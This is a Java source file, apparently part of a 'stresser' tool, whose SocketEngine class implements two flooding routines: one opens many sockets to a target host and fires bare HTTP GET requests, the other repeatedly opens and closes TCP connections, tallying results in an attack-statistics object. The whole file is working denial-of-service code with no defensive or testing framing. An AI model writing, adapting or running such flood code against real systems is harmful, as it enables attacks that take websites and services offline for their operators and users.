package com.stresser.engine;

import com.stresser.model.AttackStats;
import java.net.Socket;
import java.net.URL;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.List;

public class SocketEngine {
    
    public void executeSocketFlood(String target, int burstSize, AttackStats stats) {
        List<Socket> sockets = new ArrayList<>();
        
        try {
            URL url = new URL(target);
            String host = url.getHost();
            int port = url.getPort() != -1 ? url.getPort() : 
                      (url.getProtocol().equals("https") ? 443 : 80);
            
            for (int i = 0; i < burstSize; i++) {
                try {
                    Socket socket = new Socket(host, port);
                    socket.setSoTimeout(1000);
                    
                    PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                    out.println("GET " + url.getPath() + " HTTP/1.1");
                    out.println("Host: " + host);
                    out.println();
                    
                    sockets.add(socket);
                    stats.incrementTotal();
                    stats.incrementSuccess();
                } catch (Exception e) {
                    stats.incrementTotal();
                    stats.incrementFailed();
                }
            }
            
            Thread.sleep(300);
            
        } catch (Exception e) {
            // Ignore
        } finally {
            for (Socket socket : sockets) {
                try {
                    socket.close();
                } catch (Exception e) {
                    // Ignore
                }
            }
        }
    }
    
    public void executeTCPFlood(String target, int connections, AttackStats stats) {
        try {
            URL url = new URL(target);
            String host = url.getHost();
            int port = url.getPort() != -1 ? url.getPort() : 
                      (url.getProtocol().equals("https") ? 443 : 80);
            
            for (int i = 0; i < connections; i++) {
                try {
                    Socket socket = new Socket(host, port);
                    socket.close();
                    stats.incrementTotal();
                    stats.incrementSuccess();
                } catch (Exception e) {
                    stats.incrementTotal();
                    stats.incrementFailed();
                }
            }
        } catch (Exception e) {
            // Ignore
        }
    }
}
